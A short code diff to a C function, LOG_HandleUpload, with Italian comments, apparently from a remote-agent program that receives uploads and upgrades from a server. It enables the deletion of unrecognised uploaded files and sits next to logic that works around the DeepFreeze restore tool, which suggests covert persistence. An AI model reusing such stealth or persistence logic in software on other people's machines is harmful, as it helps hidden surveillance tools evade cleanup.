@@ -1271,9 +1271,8 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 		if (!ASP_GetUpload(is_upload, file_name, sizeof(file_name), &upload_left))
 			return FALSE;
 
-		// XXX Questa riga la inseriro' quando gli upgrade non verranno piu' inviati negli upload
-		//if (is_upload)
-		//	continue;
+		if (is_upload)
+			continue;
 		// Se si tratta di upgrade cerca di capire cosa sono....
 
 		_snprintf_s(c_file_name, sizeof(c_file_name), "%S", file_name);
@@ -1320,8 +1319,7 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 			HM_CompletePath(c_file_name, d_file_path);
 		}
 
-		// XXX Quando qui gestira' solo gli upgrade, cancellera' tutti i file che non conosce
-		// DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+		DeleteFile(HM_CompletePath(c_file_name, s_file_path));
 
 		// Se c'e' DeepFreeze fixa i file 
 		if (IsDeepFreeze()) {
